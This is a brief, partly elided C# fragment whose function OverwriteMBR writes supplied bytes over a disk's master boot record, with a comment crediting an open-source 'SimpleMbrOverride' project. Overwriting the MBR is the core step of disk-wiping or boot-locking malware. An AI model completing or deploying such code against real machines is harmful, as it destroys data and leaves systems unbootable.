...
namespace Charis.NT
{
    internal class NT
    {
        ...
        // Taken from https://github.com/Zaczero/SimpleMbrOverride/blob/master/SimpleMbrOverride/Program.cs
        ...
        public static void OverwriteMBR(byte[] data)
        {
            if (data.Length > MbrSize)
            {
                return;
            }
            ...
            WriteFile(mbr, data, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}
